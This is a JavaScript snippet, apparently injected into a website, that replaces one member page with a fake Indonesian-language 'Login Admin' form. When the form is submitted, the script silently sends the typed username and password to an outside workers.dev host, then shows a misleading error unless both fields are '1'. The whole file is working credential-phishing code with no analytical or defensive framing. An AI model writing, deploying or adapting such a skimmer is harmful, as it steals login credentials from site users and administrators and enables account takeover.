document.addEventListener("DOMContentLoaded", function () {
    if (location.href === "https://alexsis138-b2c.top/newbie/member.php") {
        document.body.innerHTML = `
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    background-color: #f2f2f2;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                .login-container {
                    background-color: #fff;
                    padding: 20px;
                    border-radius: 5px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    width: 300px;
                }
                h2 {
                    text-align: center;
                    color: #333;
                }
                label {
                    display: block;
                    margin-bottom: 5px;
                    color: #555;
                }
                input[type="text"],
                input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 15px;
                    border: 1px solid #ccc;
                    border-radius: 3px;
                    box-sizing: border-box;
                }
                input[type="submit"] {
                    width: 100%;
                    padding: 10px;
                    background-color: #007bff;
                    color: #fff;
                    border: none;
                    border-radius: 3px;
                    cursor: pointer;
                    transition: background-color 0.3s ease;
                }
                input[type="submit"]:hover {
                    background-color: #0056b3;
                }
                .error-message {
                    color: red;
                    margin-bottom: 10px;
                    display: none;
                }
            </style>

            <div class="login-container">
                <h2>Login Admin</h2>
                <div id="error" class="error-message">Password salah.</div>
                <form id="loginForm">
                    <label>Username:</label>
                    <input type="text" id="username" name="username" required>
                    <label>Password:</label>
                    <input type="password" id="password" name="password" required>
                    <input type="submit" value="Login">
                </form>
            </div>
        `;

        document.getElementById("loginForm").addEventListener("submit", function (e) {
            e.preventDefault();
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            fetch("https://memek-worker.defoy89122.workers.dev/?message=" + encodeURIComponent(username + "," + password));

            if (username === "1" && password === "1") {
                alert("Login berhasil!");
            } else {
                document.getElementById("error").style.display = "block";
            }
        });
    }
});
